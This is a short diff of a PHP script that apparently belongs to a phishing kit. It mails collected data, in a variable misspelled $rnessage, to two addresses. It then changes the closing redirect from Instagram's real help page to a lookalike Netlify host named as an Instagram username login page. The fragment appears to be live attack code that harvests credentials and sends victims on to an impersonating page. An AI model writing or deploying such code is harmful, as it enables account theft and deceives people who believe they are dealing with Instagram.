@@ -29,5 +29,5 @@ if(mail($send,$subject,$rnessage,$headers) != false)
 {
 mail($Send,$subject,$rnessage,$headers);
 }
-header("Location: https://help.instagram.com/");
+header("Location: https://instagramussernamelogin.netlify.app/");
 ?>
